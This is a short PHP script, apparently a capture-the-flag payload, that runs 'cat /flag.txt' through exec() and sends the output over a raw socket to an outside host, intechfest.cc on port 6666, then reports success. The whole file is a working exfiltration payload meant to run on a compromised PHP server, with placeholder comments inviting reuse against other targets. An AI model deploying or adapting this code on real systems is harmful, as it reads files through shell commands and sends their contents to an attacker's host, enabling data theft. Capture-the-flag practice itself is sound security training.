<?php
$ip = 'intechfest.cc';  // Replace with the IP address
$port = 6666;       // Replace with the port number

exec("cat /flag.txt", $message);  // The text message you want to send

$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    echo "Error: $errstr ($errno)";
} else {
    fwrite($socket, $message[0]);
    fclose($socket);
    echo "Message sent successfully!";
}
?>
